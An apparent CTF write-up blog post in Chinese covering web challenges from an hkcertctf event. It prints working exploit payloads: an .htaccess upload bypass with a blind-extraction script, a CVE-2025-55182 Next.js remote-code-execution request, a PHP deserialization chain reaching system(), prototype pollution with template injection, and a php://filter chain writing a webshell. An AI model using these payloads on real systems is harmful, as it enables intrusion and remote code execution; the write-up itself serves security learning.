+<p>flag{EYkQ6oJ9BdeewKZf9xxafCBamSOnKsyi</p>
+<h3 id="BabyUpload-solved"><a href="#BabyUpload-solved" class="headerlink" title="BabyUpload [solved]"></a>BabyUpload [solved]</h3><p>看看有没有 CVE 吧</p>
+<p>PHP&#x2F;7.4.33</p>
+<p>? P 都被ban了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: web-dcd40a6456.challenge.xctf.org.cn</span><br><span class="line"></span><br><span class="line">Content-Length: 190</span><br><span class="line"></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqyJp4b2ux5v3dp5w</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryqyJp4b2ux5v3dp5w</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;16x9_image_16x9.1&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">&lt;!</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryqyJp4b2ux5v3dp5w--</span><br></pre></td></tr></table></figure>
+
+<p>可以出现一个p，两个就会出问题，在内容那。文件名就不允许出现P</p>
+<p>.htaccess 可以，就是apache</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps26.jpg" alt="img">不允许出现php </p>
+<p>能不能解析phtml 用htaccess去转化phtml，问题是现在内容出现&lt;?就直接关了(不能，这个题目好像没法正常解析phtml，配置完之后变成下载文件了，我刚测试过)</p>
+<p>内容要换一个</p>
+<p>AddType fuzz 一下？</p>
+<p>AddHandler application&#x2F;x-httpd-p\ hp (内容好想不允许出现 )确实</p>
+<p>这样可以，换行可以直接洗</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: web-fa97f8f090.challenge.xctf.org.cn</span><br><span class="line">Content-Length: 254</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqyJp4b2ux5v3dp5w</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryqyJp4b2ux5v3dp5w</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">AddHandler application/x-httpd-p</span><br><span class="line">hp .foo</span><br><span class="line">p</span><br><span class="line">hp_value short_open_tag 1</span><br><span class="line">------WebKitFormBoundaryqyJp4b2ux5v3dp5w--</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>然后用js来执行应该</p>
+<p><a target="_blank" rel="noopener" href="http://web-fa97f8f090.challenge.xctf.org.cn/test/check.html">http://web-fa97f8f090.challenge.xctf.org.cn/test/check.html</a></p>
+<p>盲注一下，脚本大概是这样</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits</span><br><span class="line">def upload_loop(flag):</span><br><span class="line">  url = &quot;http://web-37d33b7543.challenge.xctf.org.cn:80/&quot;</span><br><span class="line">  headers = &#123;&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://web-dcd40a6456.challenge.xctf.org.cn&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryMXplRIfXMxuqJMCg&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;, &quot;Referer&quot;: &quot;http://web-dcd40a6456.challenge.xctf.org.cn/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,en;q=0.7,en-US;q=0.6&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;</span><br><span class="line">  data = &quot;------WebKitFormBoundaryMXplRIfXMxuqJMCg\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;.htaccess\&quot;\r\nContent-Type: image/txt\r\n\r\n&lt;If \&quot;file(&#x27;/flag&#x27;) =~ /^flag&#123;&quot;+flag+&quot;/\&quot;&gt;\r\n   ErrorDocument 404 \&quot;file_works\&quot;\r\n&lt;/If&gt;\n------WebKitFormBoundaryMXplRIfXMxuqJMCg--\r\n&quot;</span><br><span class="line">  r = requests.post(url, headers=headers, data=data)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">  flag = &quot;&quot;</span><br><span class="line">  for i in range(1,40):</span><br><span class="line">​    for j in dic:</span><br><span class="line">​      upload_loop(flag+j)</span><br><span class="line">​      r = requests.get(&quot;http://web-37d33b7543.challenge.xctf.org.cn/test/2.html&quot;,timeout=5)</span><br><span class="line">​      if &quot;file_works&quot; in r.text:</span><br><span class="line">​        flag += j</span><br><span class="line">​        print(flag)</span><br><span class="line">​        break</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>已经跑出来10多位了，总共32位</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps27.jpg" alt="img"> </p>
+<p>flag{VihbmtaCUN2mKk1578kDhkTBWi0EuGPy}</p>
+<h3 id="react-solved"><a href="#react-solved" class="headerlink" title="react [solved]"></a>react [solved]</h3><p>CVE-2025-55182</p>
+<p>GET &#x2F; HTTP&#x2F;1.1</p>
+<p>Host: web-96f000a50e.challenge.xctf.org.cn</p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;60.0.3112.113 Safari&#x2F;537.36 Assetnote&#x2F;1.0.0</p>
+<p>Next-Action: x</p>
+<p>X-Nextjs-Request-Id: b5dce965</p>
+<p>Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D</p>
+<p>Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundaryx8jO2oVc6SWP3Sad</p>
+<p>X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9</p>
+<p>Content-Length: 698</p>
+<p>——WebKitFormBoundaryx8jO2oVc6SWP3Sad</p>
+<p> Content-Disposition: form-data; name&#x3D;”0”</p>
+<p>{“then”:”$1:proto:then”,”status”:”resolved_model”,”reason”:-1,”value”:”{&quot;then&quot;:&quot;$B1337&quot;}”,”_response”:{“_prefix”:”var res&#x3D;process.mainModule.require(‘child_process’).execSync(‘cat+&#x2F;flag’).toString().trim();;throw Object.assign(new Error(‘NEXT_REDIRECT’),{digest: NEXT_REDIRECT;push;&#x2F;login?a&#x3D;${res};307;});”,”_chunks”:”$Q2”,”_formData”:{“get”:”$1:constructor:constructor”}}}</p>
+<p> ——WebKitFormBoundaryx8jO2oVc6SWP3Sad</p>
+<p> Content-Disposition: form-data; name&#x3D;”1”</p>
+<p>“$@0”</p>
+<p> ——WebKitFormBoundaryx8jO2oVc6SWP3Sad</p>
+<p> Content-Disposition: form-data; name&#x3D;”2”</p>
+<p>[]</p>
+<p> ——WebKitFormBoundaryx8jO2oVc6SWP3Sad–</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps28.jpg" alt="img"> </p>
+<p>flag{nQypGqrpvMk1GIND7P4aVHiCSUk59veW}</p>
+<h3 id="r-solved"><a href="#r-solved" class="headerlink" title="r [solved]"></a>r [solved]</h3><p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class RequestHandler &#123;</span><br><span class="line">  public $processor;</span><br><span class="line">  public $action;</span><br><span class="line">  public function __construct() &#123;</span><br><span class="line"></span><br><span class="line">​    $this-&gt;processor = new class &#123;</span><br><span class="line"></span><br><span class="line">​      private $handle;</span><br><span class="line">​      </span><br><span class="line">​      public function __construct() &#123;</span><br><span class="line">​        $this-&gt;handle = tmpfile();</span><br><span class="line">​      &#125;</span><br><span class="line">​      public function __wakeup() &#123;</span><br><span class="line">​        $this-&gt;handle = null;</span><br><span class="line">​      &#125;</span><br><span class="line">​      public function execute() &#123;</span><br><span class="line">​        if (!is_resource($this-&gt;handle)) &#123;</span><br><span class="line">​          die(&quot;Invalid resource state&lt;br&gt;&quot;);</span><br><span class="line">​        &#125;</span><br><span class="line">​        system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">​      &#125;</span><br><span class="line">​    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function __destruct() &#123;</span><br><span class="line">​    if (!is_array($this-&gt;action)) &#123;</span><br><span class="line">​      die(&quot;Error: action must be an array&quot;);</span><br><span class="line">​    &#125;</span><br><span class="line">​    $cb=$this-&gt;action;</span><br><span class="line">​    $cb();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$payload = $_GET[&#x27;p&#x27;] ?? &#x27;O:14:&quot;RequestHandler&quot;:N&#x27;;</span><br><span class="line">@unserialize($payload);</span><br></pre></td></tr></table></figure>
+
+<p><strong>PHP 的引用机制</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class RequestHandler &#123;</span><br><span class="line">  public $processor;</span><br><span class="line">  public $action;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b = new RequestHandler();</span><br><span class="line">$b-&gt;action = [&amp;$b-&gt;processor, &quot;execute&quot;];</span><br><span class="line">$a = new RequestHandler();</span><br><span class="line">$a-&gt;action = [$b, &quot;__construct&quot;];</span><br><span class="line">$payload = [$a, $b];</span><br><span class="line">echo urlencode(serialize($payload));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/$%7Bfiilename%7D/wps29.jpg" alt="img"> </p>
+<h3 id="eazy-lua-solved"><a href="#eazy-lua-solved" class="headerlink" title="eazy-lua [solved]"></a>eazy-lua [solved]</h3><p>沙箱</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps30.jpg" alt="img"> </p>
+<h3 id="ezjs-solved"><a href="#ezjs-solved" class="headerlink" title="ezjs [solved]"></a>ezjs [solved]</h3><p>圆形链污染admin</p>
+<p>POST &#x2F;login HTTP&#x2F;1.1</p>
+<p>Host: web-55d02d7dda.challenge.xctf.org.cn</p>
+<p>Content-Length: 30</p>
+<p>Cache-Control: max-age&#x3D;0</p>
+<p>Upgrae-Requests: 1</p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;143.0.0.0 Safari&#x2F;537.36</p>
+<p>Origin: <a target="_blank" rel="noopener" href="http://web-55d02d7dda.challenge.xctf.org.cn/">http://web-55d02d7dda.challenge.xctf.org.cn</a></p>
+<p>Content-Type: application&#x2F;json</p>
+<p>If-None-Match: W&#x2F;“b-40OiUdsIrIl8wd6&#x2F;cp3plVGvGEM”</p>
+<p>Connection: keep-alive</p>
+<p>{“<strong>proto</strong>“: {“admin”: true}}</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps31.jpg" alt="img"> </p>
+<p>然后到&#x2F;render端点构造exp拿到flag</p>
+<p>POST &#x2F;render HTTP&#x2F;1.1</p>
+<p>Host: web-55d02d7dda.challenge.xctf.org.cn</p>
+<p>Content-Length: 119</p>
+<p>Cache-Control: max-age&#x3D;0</p>
+<p>Upgrade-Insecure-Requests: 1</p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;143.0.0.0 Safari&#x2F;537.36</p>
+<p>Origin: <a target="_blank" rel="noopener" href="http://web-55d02d7dda.challenge.xctf.org.cn/">http://web-55d02d7dda.challenge.xctf.org.cn</a></p>
+<p>Cookie: connect.sid&#x3D;s%3Al_vC-dISL9LDyNGE26R8MUaErDOzXvsK.z%2FymcT4vCt8dFqCE827UQXXfCGCC6K7SEHQAqqygwEM</p>
+<p>Content-Type: application&#x2F;json</p>
+<p>If-None-Match: W&#x2F;“b-40OiUdsIrIl8wd6&#x2F;cp3plVGvGEM”</p>
+<p>Connection: keep-alive</p>
+<p>{</p>
+<p> “word”: “#{function(){return process.mainModule<a href="'child_process'">‘re’+’quire’</a>[‘exe’+’cSync’](‘cat &#x2F;flag’)}()}”</p>
+<p>}</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps32.jpg" alt="img"> </p>
+<p>rendeLFI写shell</p>
+<p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode&#x2F;resource&#x3D;shell.phpr然后访问shell.php?c&#x3D; 就可以执行命令了</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps33.jpg" alt="img"> </p>
+<h3 id="renderme-solved"><a href="#renderme-solved" class="headerlink" title="renderme[solved]"></a>renderme[solved]</h3><p>读源码</p>
+<p>?name&#x3D;<?=require$_GET[0]?>&amp;0&#x3D;PHP:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps34.jpg" alt="img"> </p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps35.jpg" alt="img"> </p>
+<p>读..&#x2F;vendor&#x2F;autoload.php</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps36.jpg" alt="img"> </p>
+<p>就过滤name</p>
+<p>可以用php_filter_chain</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps37.jpg" alt="img"> </p>
+<p>直接写��</p>
+<p>suid有个choom</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps38.jpg" alt="img"> </p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">dgh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/12/26/hkcertctf-wp/">http://example.com/2025/12/26/hkcertctf-wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">myift</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/png.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/12/10/2025%E9%99%87%E5%89%91%E6%9D%AFFinal-wp/" title="2025陇剑杯Final-wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">2025陇剑杯Final-wp</div></div><div class="info-2"><div class="info-item-1">wp: https://mp.weixin.qq.com/s/j2AxmU-2yhRDLnVnxD0xnQ </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">dgh</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#newrule-solved"><span class="toc-number">1.1.</span> <span class="toc-text">newrule [solved]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nettool-solved"><span class="toc-number">1.2.</span> <span class="toc-text">nettool [solved]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BabyUpload-solved"><span class="toc-number">1.3.</span> <span class="toc-text">BabyUpload [solved]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#react-solved"><span class="toc-number">1.4.</span> <span class="toc-text">react [solved]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#r-solved"><span class="toc-number">1.5.</span> <span class="toc-text">r [solved]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eazy-lua-solved"><span class="toc-number">1.6.</span> <span class="toc-text">eazy-lua [solved]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezjs-solved"><span class="toc-number">1.7.</span> <span class="toc-text">ezjs [solved]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#renderme-solved"><span class="toc-number">1.8.</span> <span class="toc-text">renderme[solved]</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/26/hkcertctf-wp/" title="hkcertctf-wp">hkcertctf-wp</a><time datetime="2025-12-26T14:25:30.000Z" title="发表于 2025-12-26 22:25:30">2025-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/10/2025%E9%99%87%E5%89%91%E6%9D%AFFinal-wp/" title="2025陇剑杯Final-wp">2025陇剑杯Final-wp</a><time datetime="2025-12-10T13:40:03.000Z" title="发表于 2025-12-10 21:40:03">2025-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/10/hackmyvm-multi/" title="hackmyvm_multi">hackmyvm_multi</a><time datetime="2025-12-10T13:39:00.000Z" title="发表于 2025-12-10 21:39:00">2025-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/28/hackmyvm-zero/" title="hackmyvm-zero">hackmyvm-zero</a><time datetime="2025-07-28T09:07:40.000Z" title="发表于 2025-07-28 17:07:40">2025-07-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/28/htb-season8-2-fluffy/" title="htb-season8.2-fluffy">htb-season8.2-fluffy</a><time datetime="2025-07-28T08:32:46.000Z" title="发表于 2025-07-28 16:32:46">2025-07-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By dgh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
